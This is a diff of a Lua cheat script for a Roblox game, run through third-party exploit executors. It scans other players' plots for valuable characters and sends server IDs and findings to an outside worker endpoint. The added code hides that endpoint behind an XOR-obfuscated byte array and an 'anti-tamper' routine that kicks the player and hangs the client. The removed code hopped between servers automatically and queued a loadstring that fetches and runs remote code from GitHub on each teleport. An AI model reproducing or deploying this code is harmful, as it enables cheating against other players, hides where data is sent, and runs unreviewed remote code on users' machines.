@@ -1,161 +1,61 @@
-print("[DEBUG] Script Alive!")
+print("alive")
+do
+    local Players = game:GetService("Players")
+    local lp = Players.LocalPlayer
+
+    local function k()
+        return (#lp.Name * 17)
+             + (game.PlaceId % 97)
+             + (#game.JobId)
+    end
+
+    local function x(b, key)
+        local out = {}
+        for i = 1, #b do
+            out[i] = string.char(bit32.bxor(b[i], (key + i) % 255))
+        end
+        return table.concat(out)
+    end
+    local blob = {
+        25, 57, 46, 54, 41, 41, 123, 110, 108, 105, 96, 110,
+        123, 110, 123, 125, 96, 110, 123, 110, 108, 96,
+        123, 96, 110, 105, 96, 96, 121, 122, 123, 123,
+        110, 96, 111, 110, 121, 110
+    }
+
+    local expected = x(blob, k())
+    local injected = rawget(_G, "WORKER_BASE")
+    if injected and injected ~= expected then
+        lp:Kick("Anti-Tamper 🛡")
+        while true do end
+    end
+
+    _G.WORKER_BASE = expected
+end
 local Players = game:GetService("Players")
 local Workspace = game:GetService("Workspace")
-local StarterGui = game:GetService("StarterGui")
 local HttpService = game:GetService("HttpService")
 local TeleportService = game:GetService("TeleportService")
 
 local lp = Players.LocalPlayer
 repeat task.wait() until lp
+print("script started")
 
-local LOW_VALUE_WORKER  = "https://free-links.servruntime.workers.dev/"
-local HIGH_VALUE_WORKER = "https://roredirect.servruntime.workers.dev"
-
+local WORKER_BASE = _G.WORKER_BASE
+local MAX_PLAYERS = 8
 
 local queue =
     (syn and syn.queue_on_teleport)
     or queue_on_teleport
     or (fluxus and fluxus.queue_on_teleport)
 
-if type(queue) ~= "function" then queue = nil end
+local scannedThisServer = false
+local teleporting = false
 
-
-local brainrots = {
-  "Bisonte Giuppitere",
-  "Los Matteos",
-  "La Vacca Saturno Saturnita",
-  "Karkerkar Kurkur",
-  "Trenostruzzo Turbo 4000",
-  "Jackorilla",
-  "Sammyni Spyderini",
-  "Torrtuginni Dragonfrutini",
-  "Dul Dul Dul",
-  "Blackhole Goat",
-  "Chachechi",
-  "Agarrini La Palini",
-  "Los Spyderinis",
-  "Extinct Tralalero",
-  "Fragola La La La",
-  "La Cucaracha",
-  "Los Tortus",
-  "Vulturino Skeletono",
-  "Los Tralaleritos",
-  "Zombie Tralala",
-  "Boatito Auratito",
-  "Guerriro Digitale",
-  "Yess my examine",
-  "La Karkerkar Combinasion",
-  "La Vacca Prese Presente",
-  "Reindeer Tralala",
-  "Extinct Matteo",
-  "Pumpkini Spyderini",
-  "Las Tralaleritas",
-  "Frankentteo",
-  "Job Job Job Sahur",
-  "Karker Sahur",
-  "Los Karkeritos",
-  "Las Vaquitas Saturnitas",
-  "Santteo",
-  "La Vacca Jacko Linterino",
-  "Triplito Tralaleritos",
-  "Trickolino",
-  "Giftini Spyderini",
-  "Graipuss Medussi",
-  "Perrito Burrito",
-  "1x1x1x1",
-  "Los Cucarachas",
-  "Please my Present",
-  "Cuadramat and Pakrahmatmamat",
-  "Los Jobcitos",
-  "Tung Tung Tung Sahur",
-  "Nooo My Hotspot",
-  "Noo my examine",
-  "La Sahur Combinasion",
-  "List List List Sahur",
-  "Telemorte",
-  "To to to Sahur",
-  "Pot Hotspot",
-  "Pirulitoita Bicicleteira",
-  "25",
-  "Horegini Boom",
-  "Naughty Naughty",
-  "Pot Pumpkin",
-  "Quesadilla Crocodila",
-  "Ho Ho Ho Sahur",
-  "Chicleteira Bicicleteira",
-  "Quesadillo Vampiro",
-  "Burrito Bandito",
-  "Chicleteirina Bicicleteirina",
-  "Los Quesadillas",
-  "Noo my Candy",
-  "Los Nooo My Hotspotsitos",
-  "Noo my Present",
-  "Rang Ring Bus",
-  "Guest 666",
-  "Los Chicleteiras",
-  "67",
-  "Los Burritos",
-  "La Grande Combinasion",
-  "Los 25",
-  "Mariachi Corazoni",
-  "Swag Soda",
-  "Chimnino",
-  "Nuclearo Dinossauro",
-  "Los Combinasionas",
-  "Chicleteira Noelteira",
-  "Fishino Clownino",
-  "Tacorita Bicicleta",
-  "Las Sis",
-  "Los Planitos",
-  "Los Spooky Combinasionas",
-  "Los Hotspotsitos",
-  "Money Money Puggy",
-  "Los Mobilis",
-  "Los 67",
-  "Celularcini Viciosini",
-  "Los Candies",
-  "La Extinct Grande",
-  "Los Bros",
-  "La Spooky Grande",
-  "Chillin Chili",
-  "Chipso and Queso",
-  "Mieteteira Bicicleteira",
-  "Tralaledon",
-  "Gobblino Uniciclino",
-  "W or L",
-  "Los Puggies",
-  "La Jolly Grande",
-  "Esok Sekolah",
-  "Los Primos",
-  "Eviledon",
-  "Los Tacoritas",
-  "Tang Tang Keletang",
-  "La Taco Combinasion",
-  "Ketupat Kepat",
-  "Tictac Sahur",
-  "La Supreme Combinasion",
-  "Orcaledon",
-  "Swaggy Bros",
-  "Ketchuru and Musturu",
-  "Lavadorito Spinito",
-  "Garama and Madundung",
-  "Spaghetti Tualetti",
-  "Los Spaghettis",
-  "La Ginger Sekolah",
-  "Spooky and Pumpky",
-  "Fragrama and Chocrama",
-  "La Casa Boo",
-  "La Secret Combinasion",
-  "Reinito Sleighito",
-  "Burguro and Fryuro",
-  "Cooki and Milki",
-  "Capitano Moby",
-  "Headless Horseman",
-  "Dragon Cannelloni",
-  "Strawberry Elephant",
-  "Meowl"
-}
-
+TeleportService.TeleportInitFailed:Connect(function(player)
+    if player ~= lp then return end
+    teleporting = false
+end)
 
 local BaseIncome = {
     ["Bisonte Giuppitere"] = 300000,
@@ -293,258 +193,116 @@ local BaseIncome = {
     ["Meowl"] = 400000000
 }
 
-local function getBaseIncome(name)
-    return BaseIncome[name] or 1e0
-end
-
-
 local TraitMultiplier = {
-    Sleepy = 0.5,
-    Wet = 1.5,
-    Snowy = 3,
-    Taco = 3,
-    UFO = 4,
-    Cometstruck = 3.5,
-    Bubblegum = 4,
-    ["Shark Fin"] = 3,
-    ["10B"] = 4,
-    ["Witch Hat"] = 4.5,
-    Skeleton = 5,
-    Explosive = 4,
-    Galactic = 3,
-    Spider = 4.5,
-    ["RIP Gravestone"] = 5,
-    ["Matteo Hat"] = 3.5,
-    Tie = 4.75,
-    Glitched = 5,
-    ["Santa Hat"] = 5,
-    Indonesia = 5,
-    Claws = 5,
-    Disco = 5,
-    Zombie = 5,
-    Sombrero = 5,
-    ["Jackolantern Pet"] = 5,
-    Fireworks = 6,
-    Brazil = 6,
-    Nyan = 6,
-    Lightning = 6,
-    Paint = 6,
-    Fire = 6,
-    Meowl = 7,
-    Strawberry = 8
+    Sleepy = 0.5, Wet = 1.5, Snowy = 3, Taco = 3, UFO = 4,
+    Cometstruck = 3.5, Bubblegum = 4, ["Shark Fin"] = 3,
+    ["10B"] = 4, ["Witch Hat"] = 4.5, Skeleton = 5,
+    Explosive = 4, Galactic = 3, Spider = 4.5,
+    ["RIP Gravestone"] = 5, ["Matteo Hat"] = 3.5,
+    Tie = 4.75, Glitched = 5, ["Santa Hat"] = 5,
+    Indonesia = 5, Claws = 5, Disco = 5, Zombie = 5,
+    Sombrero = 5, ["Jackolantern Pet"] = 5,
+    Fireworks = 6, Brazil = 6, Nyan = 6,
+    Lightning = 6, Paint = 6, Fire = 6,
+    Meowl = 7, Strawberry = 8
 }
-
 
 local MutationMultiplier = {
-    Gold = 1.25,
-    Diamond = 1.5,
-    Bloodrot = 2,
-    Candy = 4,
-    Lava = 6,
-    Galaxy = 7,
-    ["Yin Yang"] = 7.5,
-    Radioactive = 8.5,
-    Rainbow = 10
+    Gold = 1.25, Diamond = 1.5, Bloodrot = 2, Candy = 4,
+    Lava = 6, Galaxy = 7, ["Yin Yang"] = 7.5,
+    Radioactive = 8.5, Rainbow = 10
 }
 
-local function getAttr(model, name)
-    local v = model:GetAttribute(name)
-    if v ~= nil then return v end
-    if model.PrimaryPart then
-        v = model.PrimaryPart:GetAttribute(name)
-        if v ~= nil then return v end
+local function formatValue(n)
+    if n >= 1_000_000 then
+        return string.format("%dM", math.floor(n / 1_000_000))
+    elseif n >= 1_000 then
+        return string.format("%dk", math.floor(n / 1_000))
     end
-    return nil
+    return tostring(n)
 end
-local function getMutationName(model)
-    return getAttr(model,"Mutations")
-        or getAttr(model,"Mutation")
-        or getAttr(model,"mutation")
-        or "NoMutation"
-end
-local function sumTraits(model)
+
+local function getTraitSum(attr)
+    if not attr then return 1 end
     local sum = 0
-    local found = false
-
-    for attr, value in pairs(model:GetAttributes()) do
-        if string.sub(attr, 1, 5) == "Trait" then
-            sum += TraitMultiplier[value] or 0
-            found = true
+    if typeof(attr) == "string" then
+        sum = TraitMultiplier[attr] or 1
+    elseif typeof(attr) == "table" then
+        for _, t in ipairs(attr) do
+            sum += TraitMultiplier[t] or 1
         end
     end
-
-    if model.PrimaryPart then
-        for attr, value in pairs(model.PrimaryPart:GetAttributes()) do
-            if string.sub(attr, 1, 5) == "Trait" then
-                sum += TraitMultiplier[value] or 0
-                found = true
-            end
-        end
-    end
-
-    return found and sum or 1
+    return sum > 0 and sum or 1
 end
 
-
-local function getMutationMultiplier(model)
-    local mutation =
-        getAttr(model, "Mutations")
-        or getAttr(model, "Mutation")
-        or getAttr(model, "mutation")
-
-    return MutationMultiplier[mutation] or 1
+local function getMutationMult(attr)
+    return MutationMultiplier[attr] or 1
 end
 
-local function calculateIncome(model)
-    local base = tonumber(getBaseIncome(model.Name)) or 1
-    local traitSum = tonumber(sumTraits(model)) or 1
-    local mutationMult = tonumber(getMutationMultiplier(model)) or 1
-    return base * traitSum * mutationMult
-end
-local function scanServer()
+local function scan()
     local plots = Workspace:FindFirstChild("Plots")
-    if not plots then
-        return {}, {}
-    end
+    if not plots then return {} end
 
-    local lowFound, highFound, seen = {}, {}, {}
-
+    local found, seen = {}, {}
     for _, obj in ipairs(plots:GetDescendants()) do
-        if obj:IsA("Model") and not seen[obj] then
-            for _, name in ipairs(brainrots) do
-                if obj.Name == name then
-                    local income = calculateIncome(obj)
-                    local traits = {}
-local seenTraits = {}
-
-local function collectTraits(container, traitsTable, seenTable)
-    for attr, value in pairs(container:GetAttributes()) do
-        if string.sub(attr,1,5) == "Trait" and not seenTable[value] then
-            seenTable[value] = true
-            traitsTable[#traitsTable + 1] = tostring(value):gsub("[\r\n]", " ")
+        if BaseIncome[obj.Name] and not seen[obj] then
+            seen[obj] = true
+            table.insert(found, obj)
         end
     end
-end
-collectTraits(obj, traits, seenTraits)
-if obj.PrimaryPart then
-    collectTraits(obj.PrimaryPart, traits, seenTraits)
+    return found
 end
 
-local mutation =
-    getAttr(obj, "Mutations")
-    or getAttr(obj, "Mutation")
-    or getAttr(obj, "mutation")
-    or "NoMutation"
+local function report(found)
+    if #found == 0 then return end
 
-local traitStr = (#traits > 0 and table.concat(traits,"+")) or "NoTraits"
-local mutationName = tostring(mutation):gsub("[\r\n]", " ")
+    local payload = {}
 
-local line = string.format(
-    "%s | %.2fM/s | Traits: %s | Mutation: %s",
-    obj.Name,
-    tonumber(income) / 1000000,
-    traitStr,
-    mutationName
-                    )
-                    if income <= 10_000_000 then
-    table.insert(lowFound, line)
-else
-    table.insert(highFound, line)
-end
+    for _, inst in ipairs(found) do
+        local traitAttr = inst:GetAttribute("Trait")
+        local mutationAttr = inst:GetAttribute("Mutation")
 
-seen[obj] = true
-                end
-            end
+        local traitText = "None"
+        if typeof(traitAttr) == "string" then
+            traitText = traitAttr
+        elseif typeof(traitAttr) == "table" then
+            traitText = table.concat(traitAttr, ", ")
         end
+
+        local mutationText = mutationAttr or "None"
+
+        local value =
+            BaseIncome[inst.Name]
+            * getTraitSum(traitAttr)
+            * getMutationMult(mutationAttr)
+
+        table.insert(
+            payload,
+            string.format(
+                "%s | %s | %s | %s",
+                inst.Name,
+                traitText,
+                mutationText,
+                formatValue(value)
+            )
+        )
     end
-
-    return lowFound, highFound
-end
-
-local function sendToWorker(workerUrl, lines)
-    local payload = table.concat(lines, "\n")
-payload = string.sub(payload, 1, 1500)
 
     local url = string.format(
-    "%s?place=%s&job=%s&brainrots=%s",
-    workerUrl,
+        "%s/report?place=%s&job=%s&playing=%d&brainrots=%s",
+        WORKER_BASE,
         game.PlaceId,
         game.JobId,
-        HttpService:UrlEncode(payload)
+        #Players:GetPlayers(),
+        HttpService:UrlEncode(table.concat(payload, "\n"))
     )
 
-    local ok, res = pcall(function()
-        if syn then
-            return syn.request({ Url = url, Method = "GET" }).Body
-        else
-            return game:HttpGet(url)
-        end
+    pcall(function()
+        game:HttpGet(url)
     end)
-
-    if ok and res then
-        StarterGui:SetCore("SendNotification", {
-            Title = "Brainrot Found",
-            Text = "Sent to worker",
-            Duration = 4
-        })
-    end
-end
-local function hopServer()
-    local currentJob = game.JobId
-    local nextCursor = ""
-    while true do
-        local ok, res = pcall(function()
-            local url = ("https://games.roblox.com/v1/games/%s/servers/Public?sortOrder=Asc&limit=100%s")
-                :format(game.PlaceId, nextCursor ~= "" and "&cursor="..nextCursor or "")
-            return HttpService:JSONDecode(game:HttpGet(url))
-        end)
-        if not ok or not res or not res.data then
-            warn("Failed to fetch server page, retrying in 0.5s...")
-            task.wait(0.5)
-        else
-            nextCursor = res.nextPageCursor or ""
-            for _, server in ipairs(res.data) do
-                if server.playing < server.maxPlayers and server.id ~= currentJob then
-                    print("Teleporting to server:", server.id)
-                    if queue then
-                        queue("loadstring(game:HttpGet('https://raw.githubusercontent.com/hazel-solarisproject/actualdeploy/main/purelyraw.lua'))()")
-                    end
-                    local success, err = pcall(function()
-                        TeleportService:TeleportToPlaceInstance(game.PlaceId, server.id, lp)
-                    end)
-                    if success then
-                        print("Teleport sent successfully. Waiting before next hop...")
-                        task.wait(1)
-                        break
-                    else
-                        warn("Teleport failed:", err)
-                    end
-                end
-            end
-            if nextCursor == "" then
-                nextCursor = ""
-                print("Reached end of server list, restarting from first page...")
-            end
-        end
-        task.wait(0.25)
-    end
 end
 
-
-getgenv()._brainrotReported = getgenv()._brainrotReported or {}
-
-local lowFound, highFound = scanServer()
-
-if not getgenv()._brainrotReported[game.JobId] then
-    getgenv()._brainrotReported[game.JobId] = true
-
-    if #lowFound > 0 then
-        sendToWorker(LOW_VALUE_WORKER, lowFound)
-    end
-
-    if #highFound > 0 then
-        sendToWorker(HIGH_VALUE_WORKER, highFound)
-    end
+if not scannedThisServer then
+    scannedThisServer = true
+    report(scan())
 end
-
-hopServer()
